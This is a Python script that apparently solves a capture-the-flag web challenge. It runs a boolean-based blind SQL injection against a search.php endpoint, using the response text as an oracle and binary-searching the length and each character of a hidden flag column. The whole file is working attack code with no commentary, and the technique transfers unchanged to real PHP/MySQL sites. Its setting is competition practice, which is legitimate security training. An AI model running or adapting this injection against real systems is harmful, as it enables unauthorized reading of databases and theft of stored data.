#!/usr/bin/env python3
import urllib.request
BASE = "https://f4e3f42b4687b3d9401c897d.http-ctf2.dasctf.com/search.php"
def oracle(cond):
    url = f"{BASE}?id=2-({cond})"
    try:
        resp = urllib.request.urlopen(url, timeout=10).read().decode('utf-8','ignore')
        return 'NO! Not this!' in resp
    except:
        return False

sq = "(select(group_concat(fl4gawsl))from(Flaaaaag))"
# Find length
lo, hi = 0, 500
while lo < hi:
    mid = (lo + hi + 1) // 2
    if oracle(f"length({sq})>={mid}"):
        lo = mid
    else:
        hi = mid - 1
print(f"Length: {lo}")
# Extract
result = ""
for pos in range(1, lo + 1):
    lo_c, hi_c = 32, 126
    while lo_c < hi_c:
        mid = (lo_c + hi_c + 1) // 2
        if oracle(f"ord(substr({sq},{pos},1))>={mid}"):
            lo_c = mid
        else:
            hi_c = mid - 1
    c = chr(lo_c)
    result += c
    if pos % 10 == 0 or pos == lo:
        print(f"[{pos}/{lo}] {result}")
print(f"\nFLAG: {result}")
